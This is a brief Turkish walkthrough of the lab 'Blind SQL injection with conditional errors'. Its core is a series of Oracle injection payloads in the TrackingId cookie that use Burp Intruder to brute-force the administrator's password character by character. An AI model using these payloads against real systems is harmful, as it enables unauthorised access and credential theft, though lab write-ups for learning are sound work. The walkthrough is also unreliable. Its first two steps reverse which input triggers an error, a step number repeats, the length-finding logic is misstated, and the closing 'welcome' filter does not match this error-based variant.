LAB: Blind SQL injection with conditional errors

1 - Burp Suite ile istek yakalayın. TrackingId değişkenini aşağıdaki ile değiştirin. Hata vermeyecektir.
TrackingId=xyz'

2 - TrackingId değişkenini aşağıdaki ile değiştirin. Hata verecektir. Buranın sömürülebileceğini anlıyoruz.
TrackingId=xyz''

3 - dual tablosundaki verileri yazdırıyoruz.
TrackingId=xyz'||(SELECT '' FROM dual)||'

4 - users tablosundaki bir kullanıcı ile  giriş yapabildiğimizi anlıyoruz.
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

4 - Administrator kullanıcısı ile giriş yapabildiğimizi anlıyoruz.
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

5 - Administrator kullanıcısının parolasının uzunluğunu bulmaya çalışıyoruz.
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

6 - Burp Intruder -> Sniper -> Numbers -> 1, 30, 1 ilk hata verilen yer parola uzunluğunu belirtir. 
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>§1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

7 - Parolasının uzunluğunu bulduktan sonra brute force yaparak parolayı bulmaya calisacagiz. 
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Burp Suite -> Intruder -> Cluster Bomb
1 - Numbers - 1, 20, 1 burada 20 karakterden oluştuğunu bulduğumuz parolanın her bir indexini temsil ediyor.
2 - Brute Forcer - 1,1 burada her bir karakterin alabileceği değerleri temsil ediyor.

Saldırı bitince 'welcome' stringi ile filtereleyerek aşağıdaki tabloyu doldurun.
Payload 1 -> index
Payload 2 -> değer

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
a 2 d f k 4 5 7 k 9   c  d  k  x  3  4  5  6  a  b

8 - administrator kullanıcı ile giriş yapınca oda çözülüyor.
